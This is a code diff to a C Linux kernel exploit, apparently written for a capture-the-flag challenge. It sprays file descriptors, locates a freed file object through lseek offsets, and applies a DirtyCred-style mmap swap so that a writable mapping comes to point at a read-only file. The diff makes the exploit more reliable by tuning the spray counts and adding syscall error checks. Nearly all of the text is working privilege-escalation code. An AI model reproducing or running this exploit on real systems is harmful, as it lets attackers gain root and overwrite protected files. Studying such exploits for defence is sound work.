@@ -5,7 +5,8 @@
 
 #define SPRAY_VULN 0x1000
 #define FS_CONTEXT_SLAB_SIZE 0x100
-#define NUM_SPRAY_FDS 0xc00
+#define NUM_SPRAY_FDS_1 0xc00
+#define NUM_SPRAY_FDS_2 0x300
 #define PASSWD_SPRAY_FDS 0x300
 #define NOP_SLIDE_SIZE 0x50000
 
@@ -55,9 +56,9 @@ int main(void) {
   lstage("Start the main exploit");
 
   linfo("Spray FDs");
-  int spray_fds[NUM_SPRAY_FDS];
-  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-    spray_fds[i] = open("/tmp/chovid99", O_RDWR); // /tmp/a is a writable file
+  int spray_fds[NUM_SPRAY_FDS_1];
+  for (int i = 0; i < NUM_SPRAY_FDS_1; i++) {
+    spray_fds[i] = SYSCHK(open("/tmp/chovid99", O_RDWR)); // /tmp/a is a writable file
     if (spray_fds[i] == -1) {
       puts("Failed to open FDs");
       return EXIT_FAILURE;
@@ -75,18 +76,18 @@ int main(void) {
   // Spray to replace the previously freed chunk
   // Set the lseek to 0x8, so that we can find easily the fd
   linfo("Find the freed FD using lseek");
-  int spray_fds_2[NUM_SPRAY_FDS];
-  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-    spray_fds_2[i] = open("/tmp/chovid99", O_RDWR);
-    lseek(spray_fds_2[i], 0x8, SEEK_SET);
+  int spray_fds_2[NUM_SPRAY_FDS_2];
+  for (int i = 0; i < NUM_SPRAY_FDS_2; i++) {
+    spray_fds_2[i] = SYSCHK(open("/tmp/chovid99", O_RDWR));
+    SYSCHK(lseek(spray_fds_2[i], 0x8, SEEK_SET));
   }
   // After: 2 fd 1 refcount (Because new file)
 
   // The freed fd will have lseek value set to 0x8. Try to find it.
-  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-    if (lseek(spray_fds[i], 0, SEEK_CUR) == 8) {
+  for (int i = 0; i < NUM_SPRAY_FDS_1; i++) {
+    if (SYSCHK(lseek(spray_fds[i], 0, SEEK_CUR)) == 8) {
       freed_fd = spray_fds[i];
-      lseek(freed_fd, 0x0, SEEK_SET);
+      SYSCHK(lseek(freed_fd, 0x0, SEEK_SET));
       linfo("Found freed fd: %d\n", freed_fd);
       break;
     }
@@ -106,13 +107,14 @@ int main(void) {
   lstage("DirtyCred via mmap");
   char *file_mmap = mmap(NULL, NOP_SLIDE_SIZE + sizeof(readflag),
                          PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
+  CHK(file_mmap != MAP_FAILED);
   // After: 3 fd 2 refcount (Because new file)
 
-  close(freed_fd);
+  SYSCHK(close(freed_fd));
   // After: 2 fd 1 refcount (Because new file)
 
-  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-    close(spray_fds_2[i]);
+  for (int i = 0; i < NUM_SPRAY_FDS_2; i++) {
+    SYSCHK(close(spray_fds_2[i]));
   }
   // After: 1 fd 0 refcount (Because new file)
   // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file
